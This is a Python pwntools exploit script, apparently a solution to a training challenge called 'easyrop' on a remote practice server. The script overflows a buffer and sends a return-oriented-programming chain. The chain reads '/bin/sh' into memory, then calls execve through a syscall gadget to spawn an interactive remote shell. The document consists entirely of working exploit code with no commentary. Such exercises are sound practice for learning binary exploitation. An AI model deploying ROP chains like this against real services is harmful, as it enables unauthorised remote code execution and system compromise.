from pwn import*

#p = process("./easyrop")
p = remote("bin.training.offdef.it", 2015)

input("wait")


def fun(addr):
	half = addr >> 32
	second_half = addr & 0xffffffff

	p.send(p32(second_half))
	p.send(p32(0))

	p.send(p32(half))
	p.send(p32(0))

#con 0x8 arrivo al SEIP



array = [0x1]*7

gadget_read_execve = 0x00000000004001c2
addr_bin_sh = 0x600500
addr_syscall = 0x0000000000400168
addr_read = 0x00400144

array = array + [
	gadget_read_execve,
	0,
	addr_bin_sh,
	8,
	0,
	addr_read,
	gadget_read_execve,
	addr_bin_sh,
    0,
    0,
    0x3b,
    addr_syscall
]

for i in range(0,len(array)):
	fun(array[i])

input("wait")
p.sendline(b"")
input("wait")
p.sendline(b"")


input("wait")
p.send(b"/bin/sh\x00")
p.interactive()